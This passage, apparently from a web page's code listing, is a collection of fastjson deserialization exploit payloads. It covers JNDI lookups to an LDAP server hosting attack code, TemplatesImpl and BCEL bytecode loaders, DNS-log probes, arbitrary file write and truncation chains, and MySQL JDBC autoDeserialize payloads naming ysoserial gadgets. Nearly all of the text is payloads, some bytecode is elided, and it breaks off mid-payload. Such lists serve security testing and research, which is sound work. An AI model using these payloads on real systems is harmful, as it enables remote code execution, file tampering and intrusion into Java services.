class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br></pre></td><td class="code"><pre><span class="line">JdbcRowSetImpl</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">    &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;,</span><br><span class="line">    &quot;autoCommit&quot;: true</span><br><span class="line">&#125;</span><br><span class="line">TemplatesImpl</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class="line">	&quot;_bytecodes&quot;: [&quot;yv66vgA...k=&quot;],</span><br><span class="line">	&#x27;_name&#x27;: &#x27;su18&#x27;,</span><br><span class="line">	&#x27;_tfactory&#x27;: &#123;&#125;,</span><br><span class="line">	&quot;_outputProperties&quot;: &#123;&#125;,</span><br><span class="line">&#125;</span><br><span class="line">JndiDataSourceFactory</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,</span><br><span class="line">    &quot;properties&quot;: &#123;</span><br><span class="line">      &quot;data_source&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">SimpleJndiBeanFactory</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,</span><br><span class="line">    &quot;targetBeanName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;,</span><br><span class="line">    &quot;propertyPath&quot;: &quot;su18&quot;,</span><br><span class="line">    &quot;beanFactory&quot;: &#123;</span><br><span class="line">      &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,</span><br><span class="line">      &quot;shareableResources&quot;: [</span><br><span class="line">        &quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">DefaultBeanFactoryPointcutAdvisor</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;,</span><br><span class="line">   &quot;beanFactory&quot;: &#123;</span><br><span class="line">     &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,</span><br><span class="line">     &quot;shareableResources&quot;: [</span><br><span class="line">       &quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">     ]</span><br><span class="line">   &#125;,</span><br><span class="line">   &quot;adviceBeanName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">   &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><br><span class="line">&#125;</span><br><span class="line">WrapperConnectionPoolDataSource</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,</span><br><span class="line">    &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:aced000...6f;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">JndiRefForwardingDataSource</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,</span><br><span class="line">    &quot;jndiName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;,</span><br><span class="line">    &quot;loginTimeout&quot;: 0</span><br><span class="line">  &#125;</span><br><span class="line">InetAddress</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;java.net.InetAddress&quot;,</span><br><span class="line">	&quot;val&quot;: &quot;http://dnslog.com&quot;</span><br><span class="line">&#125;</span><br><span class="line">Inet6Address</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;java.net.Inet6Address&quot;,</span><br><span class="line">	&quot;val&quot;: &quot;http://dnslog.com&quot;</span><br><span class="line">&#125;</span><br><span class="line">URL</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;java.net.URL&quot;,</span><br><span class="line">	&quot;val&quot;: &quot;http://dnslog.com&quot;</span><br><span class="line">&#125;</span><br><span class="line">JSONObject</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">	&#123;</span><br><span class="line">		&quot;@type&quot;: &quot;java.net.URL&quot;,</span><br><span class="line">		&quot;val&quot;: &quot;http://dnslog.com&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">URLReader</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;poc&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">		&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONReader&quot;,</span><br><span class="line">		&quot;reader&quot;: &#123;</span><br><span class="line">			&quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,</span><br><span class="line">			&quot;url&quot;: &quot;http://127.0.0.1:9999&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">AutoCloseable 任意文件写入</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">	&quot;@type&quot;: &quot;org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream&quot;,</span><br><span class="line">	&quot;out&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;java.io.FileOutputStream&quot;,</span><br><span class="line">		&quot;file&quot;: &quot;/path/to/target&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;parameters&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;org.apache.commons.compress.compressors.gzip.GzipParameters&quot;,</span><br><span class="line">		&quot;filename&quot;: &quot;filecontent&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">BasicDataSource</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot; : &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">  &quot;driverClassName&quot; : &quot;$$BCEL$$$l$8b$I$A$A$A$A...&quot;,</span><br><span class="line">  &quot;driverClassLoader&quot; :</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;@type&quot;:&quot;Lcom.sun.org.apache.bcel.internal.util.ClassLoader;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">JndiConverter</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,</span><br><span class="line">	&quot;AsText&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">&#125;</span><br><span class="line">JtaTransactionConfig</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,</span><br><span class="line">	&quot;properties&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;java.util.Properties&quot;,</span><br><span class="line">		&quot;UserTransaction&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">JndiObjectFactory</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,</span><br><span class="line">	&quot;resourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">&#125;</span><br><span class="line">AnterosDBCPConfig</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,</span><br><span class="line">	&quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">&#125;</span><br><span class="line">AnterosDBCPConfig2</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,</span><br><span class="line">	&quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">&#125;</span><br><span class="line">CacheJndiTmLookup</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,</span><br><span class="line">	&quot;jndiNames&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">&#125;</span><br><span class="line">AutoCloseable 清空指定文件</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">    &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;,</span><br><span class="line">    &quot;file&quot;:&quot;/tmp/nonexist&quot;,</span><br><span class="line">    &quot;append&quot;:false</span><br><span class="line">&#125;</span><br><span class="line">AutoCloseable 清空指定文件</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">    &quot;@type&quot;:&quot;java.io.FileWriter&quot;,</span><br><span class="line">    &quot;file&quot;:&quot;/tmp/nonexist&quot;,</span><br><span class="line">    &quot;append&quot;:false</span><br><span class="line">&#125;</span><br><span class="line">AutoCloseable 任意文件写入</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;stream&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;,</span><br><span class="line">        &quot;file&quot;:&quot;/tmp/nonexist&quot;,</span><br><span class="line">        &quot;append&quot;:false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;writer&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;:&quot;org.apache.solr.common.util.FastOutputStream&quot;,</span><br><span class="line">        &quot;tempBuffer&quot;:&quot;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&quot;,</span><br><span class="line">        &quot;sink&quot;:</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;$ref&quot;:&quot;$.stream&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;start&quot;:38</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;close&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;:&quot;org.iq80.snappy.SnappyOutputStream&quot;,</span><br><span class="line">        &quot;out&quot;:</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;$ref&quot;:&quot;$.writer&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">AutoCloseable MarshalOutputStream 任意文件写入</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&#x27;@type&#x27;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">	&#x27;@type&#x27;: &#x27;sun.rmi.server.MarshalOutputStream&#x27;,</span><br><span class="line">	&#x27;out&#x27;: &#123;</span><br><span class="line">		&#x27;@type&#x27;: &#x27;java.util.zip.InflaterOutputStream&#x27;,</span><br><span class="line">		&#x27;out&#x27;: &#123;</span><br><span class="line">			&#x27;@type&#x27;: &#x27;java.io.FileOutputStream&#x27;,</span><br><span class="line">			&#x27;file&#x27;: &#x27;dst&#x27;,</span><br><span class="line">			&#x27;append&#x27;: false</span><br><span class="line">		&#125;,</span><br><span class="line">		&#x27;infl&#x27;: &#123;</span><br><span class="line">			&#x27;input&#x27;: &#123;</span><br><span class="line">				&#x27;array&#x27;: &#x27;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#x27;,</span><br><span class="line">				&#x27;limit&#x27;: 22</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#x27;bufLen&#x27;: 1048576</span><br><span class="line">	&#125;,</span><br><span class="line">	&#x27;protocolVersion&#x27;: 1</span><br><span class="line">&#125;</span><br><span class="line">BasicDataSource</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">		&quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">		&quot;driverClassName&quot;: &quot;true&quot;,</span><br><span class="line">		&quot;driverClassLoader&quot;: &#123;</span><br><span class="line">			&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A&quot;</span><br><span class="line">	&#125;</span><br><span class="line">HikariConfig</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;com.zaxxer.hikari.HikariConfig&quot;,</span><br><span class="line">	&quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">&#125;</span><br><span class="line">HikariConfig</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;com.zaxxer.hikari.HikariConfig&quot;,</span><br><span class="line">	&quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">&#125;</span><br><span class="line">HikariConfig</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,</span><br><span class="line">	&quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">&#125;</span><br><span class="line">HikariConfig</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,</span><br><span class="line">	&quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">&#125;</span><br><span class="line">SessionBeanProvider</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,</span><br><span class="line">	&quot;jndiName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;,</span><br><span class="line">	&quot;Object&quot;: &quot;su18&quot;</span><br><span class="line">&#125;</span><br><span class="line">JMSContentInterceptor</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;,</span><br><span class="line">	&quot;parameters&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;java.util.Hashtable&quot;,</span><br><span class="line">		&quot;java.naming.factory.initial&quot;: &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,</span><br><span class="line">		&quot;topic-factory&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;namespace&quot;: &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">ContextClassLoaderSwitcher</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.jboss.util.loading.ContextClassLoaderSwitcher&quot;,</span><br><span class="line">	&quot;contextClassLoader&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;a&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">OracleManagedConnectionFactory</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;,</span><br><span class="line">	&quot;xaDataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">&#125;</span><br><span class="line">JNDIConfiguration</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.apache.commons.configuration.JNDIConfiguration&quot;,</span><br><span class="line">	&quot;prefix&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">&#125;</span><br><span class="line">JDBC4Connection</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">	&quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;,</span><br><span class="line">	&quot;hostToConnectTo&quot;: &quot;172.20.64.40&quot;,</span><br><span class="line">	&quot;portToConnectTo&quot;: 3306,</span><br><span class="line">	&quot;url&quot;: &quot;jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,</span><br><span class="line">	&quot;databaseToConnectTo&quot;: &quot;test&quot;,</span><br><span class="line">	&quot;info&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;java.util.Properties&quot;,</span><br><span class="line">		&quot;PORT&quot;: &quot;3306&quot;,</span><br><span class="line">		&quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,</span><br><span class="line">		&quot;autoDeserialize&quot;: &quot;true&quot;,</span><br><span class="line">		&quot;user&quot;: &quot;yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn&quot;,</span><br><span class="line">		&quot;PORT.1&quot;: &quot;3306&quot;,</span><br><span class="line">		&quot;HOST.1&quot;: &quot;172.20.64.40&quot;,</span><br><span class="line">		&quot;NUM_HOSTS&quot;: &quot;1&quot;,</span><br><span class="line">		&quot;HOST&quot;: &quot;172.20.64.40&quot;,</span><br><span class="line">		&quot;DBNAME&quot;: &quot;test&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">LoadBalancedMySQLConnection</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">	&quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;,</span><br><span class="line">	&quot;proxy&quot;: &#123;</span><br><span class="line">		&quot;connectionString&quot;: &#123;</span><br><span class="line">			&quot;url&quot;: &quot;jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">UnpooledDataSource</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;x&quot;: &#123;</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">			&quot;name&quot;: &#123;</span><br><span class="line">				&quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br><span class="line">				&quot;val&quot;: &quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><br><span class="line">			&#125;,</span><br><span class="line">			&quot;c&quot;: &#123;</span><br><span class="line">				&quot;@type&quot;: &quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;,</span><br><span class="line">				&quot;key&quot;: &#123;</span><br><span class="line">					&quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br><span class="line">					&quot;val&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">				&#125;,</span><br><span class="line">				&quot;driverClassLoader&quot;: &#123;</span><br><span class="line">					&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">				&#125;,</span><br><span class="line">				&quot;driver&quot;: &quot;$$BCEL$$$l$8b$...&quot;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;: &quot;a&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">LoadBalancedMySQLConnection2</span><br><span class="line"></span><br><span class="line">&#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;, &quot;proxy&quot;: &#123; &quot;connectionString&quot;:&#123; &quot;url&quot;:&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;useSSL=false&amp;user=yso_CommonsCollections5_calc&quot; &#125; &#125; &#125;&#125;</span><br><span class="line">ReplicationMySQLConnection</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">       &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">       &quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;,</span><br><span class="line">       &quot;proxy&quot;: &#123;</span><br><span class="line">              &quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;,</span><br><span class="line">              &quot;connectionUrl&quot;:&#123;</span><br><span class="line">                     &quot;@type&quot;:&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;,</span><br><span class="line">                     &quot;masters&quot;:[&#123;</span><br><span class="line">                            &quot;host&quot;:&quot;&quot;</span><br><span class="line">                     &#125;],</span><br><span class="line">                     &quot;slaves&quot;:[],</span><br><span class="line">                     &quot;properties&quot;:&#123;</span><br><span class="line">                            &quot;host&quot;:&quot;127.0.0.1&quot;,</span><br><span class="line">                            &quot;port&quot;:&quot;3306&quot;,          </span><br><span class="line">                            &quot;user&quot;:&quot;yso_CommonsCollections4_calc&quot;,</span><br><span class="line">                            &quot;dbname&quot;:&quot;dbname&quot;,</span><br><span class="line">                            &quot;password&quot;:&quot;pass&quot;,</span><br><span class="line">                            